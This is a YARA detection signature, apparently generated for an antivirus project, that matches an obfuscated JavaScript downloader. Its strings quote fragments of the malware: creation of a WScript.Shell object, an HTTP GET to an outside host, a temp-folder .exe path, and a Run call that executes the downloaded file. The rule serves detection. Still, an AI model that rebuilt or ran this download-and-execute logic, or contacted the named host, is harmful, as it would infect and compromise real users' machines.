rule sig_20160330_096fef5356274b7306f694a2a4554c0c {
  meta:
    description = "datamaliciousorder - file 20160330_096fef5356274b7306f694a2a4554c0c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "61c193b8bfc15e9142e6cb2d9c3a0433efce4b2809b473d1da968f82fc87e8d6"

  strings:
    $s1  = "function _AG(_I1, _ST){_W = _W * 1; return _I1 - _ST;};" fullword ascii
    $s2  = "var _W0 = function _I() {return WScript[_FG](\"WScript\"+\".Shell\");}(), _SK = 11;" fullword ascii
    $s3  = "_V[_H0](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s4  = "if (_V[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _H() {return _W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IXiM1xLzkSAjU.ex\" + \"e\";};" fullword ascii
    $s6  = "function _F(){return _NC + \"\";};" fullword ascii
    $s7  = "function _T() {return ((_U1 == true) && (_U1 == _YT)) ? 1 : _W;};" fullword ascii
    $s8  = "function _LK(_SE){_W0[\"Run\"](_SE, _W, _W);};" fullword ascii
    $s9  = "var _L = new this[\"Date\"]();" fullword ascii
    $s10 = "function _QA(){return _FG;};" fullword ascii
    $s11 = " while (_M){" fullword ascii
    $s12 = "function _G(){return 22;};" fullword ascii
    $s13 = "return _AG(_L0, _PU);" fullword ascii
    $s14 = "function _IX(_F0) {var _JJ = (1, 2, 3, 4, 5, _F0); return _JJ;};" fullword ascii
    $s15 = "function _CJ()" fullword ascii
    $s16 = "var _U1 = false;" fullword ascii
    $s17 = "_YT = true; " fullword ascii
    $s18 = "_U1 = true; " fullword ascii
    $s19 = "var _BH = false;" fullword ascii
    $s20 = "var _YT = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}